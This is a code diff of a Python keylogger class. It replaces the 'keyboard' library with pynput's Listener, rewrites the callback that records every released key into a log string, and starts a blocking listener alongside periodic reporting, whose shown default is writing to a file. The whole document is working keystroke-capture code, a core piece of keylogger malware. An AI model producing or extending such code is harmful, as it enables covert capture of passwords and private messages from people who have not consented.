@@ -1,6 +1,6 @@
 from datetime import datetime
 from threading import Timer
-import keyboard
+from pynput.keyboard import Listener, Key
 
 class Keylogger:
     def __init__(self, interval=60, reportMethod="file"):
@@ -10,27 +10,20 @@ class Keylogger:
         self.startDatetime = datetime.now()
         self.endDatetime = datetime.now()
 
-    def callback(self, event):
+    def callback(self, key):
         """
             This callback is invoked whenever a keyboard event is occured
         """
-        name = event.name
+        specialKeys = {
+            Key.space: " ",
+            Key.enter: "[ENTER]\n",
+            Key.backspace: "[BACKSPACE]"
+        }
 
-        if len(name) > 1:
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-
-        self.log += name
+        if key in specialKeys.keys():
+            self.log += specialKeys[key]
+        else:
+            self.log += str(key).replace("'","")
 
     def report(self):
         """
@@ -64,13 +57,12 @@ class Keylogger:
     def start(self):
         self.startDatetime = datetime.now()
         # Start the keylogger
-        keyboard.on_release(callback=self.callback)
         # Start reporting the keylogs
         self.report()
         # Make a simple message
         print(f"{datetime.now()} - Started keylogger")
-        # Block the current thread, wait until CTRL+C is pressed
-        keyboard.wait()
+        with Listener(on_release=self.callback) as listener:
+            listener.join()
 
     def updateFilename(self):
         """
